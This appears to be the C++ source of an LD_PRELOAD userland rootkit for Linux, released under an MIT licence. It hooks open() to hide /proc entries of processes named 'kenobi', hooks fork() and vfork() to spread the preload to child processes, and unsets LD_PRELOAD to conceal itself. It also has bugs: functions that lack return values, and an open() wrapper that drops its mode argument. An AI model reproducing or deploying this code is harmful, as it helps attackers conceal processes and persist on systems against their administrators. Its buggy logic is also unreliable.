/*MIT License

Copyright (c) 2018 bobrofon

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.*/

#include <dlfcn.h>
#include <unistd.h>

#include <cstring>

#include <experimental/filesystem>
#include <regex>
#include <fstream>

namespace {

using namespace std::string_literals;

namespace fs = std::experimental::filesystem;

constexpr auto LD_PRELOAD = "LD_PRELOAD";
constexpr auto KENOBI = "kenobi";

void greeting() {
	fputs("- Hello there.\n", stderr);
	fputs(("- General pid("s + std::to_string(getpid()) + ")!\n").data(), stderr);
}

std::string_view current_preload_path() {
    const auto current_preload_ptr = getenv(LD_PRELOAD);
    if (current_preload_ptr == nullptr) {
        return std::string_view{};
    }
    return current_preload_ptr;
}

std::string_view current_so_path() {
    Dl_info so_info{};
    const auto some_addr_from_so{reinterpret_cast<void*>(current_so_path)};
    if (!dladdr(some_addr_from_so, &so_info)) {
        throw std::runtime_error("I am not a dynamic library");
    }
    return so_info.dli_fname;
}

void export_ld_preload() {
    const std::string self_path{current_so_path()};

	constexpr auto overwrite = true;
    if (auto err = setenv(LD_PRELOAD, self_path.data(), overwrite); err) {
	    throw std::runtime_error("'setenv("s + LD_PRELOAD + ", " + self_path
	                             + ")' failed: " + strerror(err));
    }
	if (current_preload_path() != self_path) {
		throw std::runtime_error("'setenv' failed without error");
	}
}

void _add_self_preload() {
	export_ld_preload();
	// TODO выяснить почему не работает первый вызов
	export_ld_preload();
}

void add_self_preload() noexcept {
	try {
		_add_self_preload();
	} catch (...) {
		return;
	}
}

bool _is_preloaded() {
	return current_preload_path() == current_so_path();
}

bool is_preloaded() noexcept {
	try {
		_is_preloaded();
	} catch (...) {
		return false;
	}
}

void _hide_ld_preload() {
	unsetenv(LD_PRELOAD);
}

bool hide_ld_preload() noexcept {
	try {
		_hide_ld_preload();
	} catch (...) {
		return false;
	}
}

pid_t to_pid(const std::string& path) {
	static const std::regex pid_regex{"/proc/(\\d+)/.*"};
	std::smatch pid_match{};
	if (std::regex_match(path, pid_match, pid_regex)) {
		std::stringstream s{pid_match[1]};
		pid_t pid{};
		s >> pid;
		return pid;
	}
	return 0;
}

std::string proc_name(const pid_t pid) {
	static const fs::path PROC{"/proc"};
	std::ifstream stat{PROC / std::to_string(pid) / "status"s};
	if (!stat) {
		return "";
	}
	std::string tmp{};
	std::string name{};
	if (stat >> tmp >> name) {
		return name;
	}
	return "";
}

bool _is_hiden(const fs::path& target) {
	const auto pid = to_pid(fs::canonical(target).generic_string());
	if (!pid) {
		return false;
	}
	return proc_name(pid) == KENOBI;
}

bool is_hiden(const char *pathname) noexcept {
	try {
		return _is_hiden(fs::path{pathname});
	} catch (...) {
		return false;
	}
}

} // namespace

using fork_t = pid_t (*)();
using open_t = int (*)(const char *, int, ...);

extern "C" {

// TODO нужно переопределять exec функции, но там сложно разбирать vararg аргументы

// надеемся, что это часть fork exec
pid_t fork(void) {
	auto real_fork = reinterpret_cast<fork_t>(dlsym(RTLD_NEXT,"fork"));
	add_self_preload();
	return real_fork();
}

pid_t vfork(void) {
	auto real_vfork = reinterpret_cast<fork_t>(dlsym(RTLD_NEXT,"vfork"));
	add_self_preload();
	return real_vfork();
}

int open (const char *pathname, int flags, ...){

	auto real_open = reinterpret_cast<open_t>(dlsym(RTLD_NEXT, "open"));
	va_list args;
	mode_t mode{};

	if (is_hiden(pathname)) {
		return -1;
	}

	return real_open(pathname, flags, mode);
}

}


__attribute__((constructor))
void init() {
    //greeting();
	if (is_preloaded()) {
		hide_ld_preload();
	} else {
		add_self_preload();
	}
}
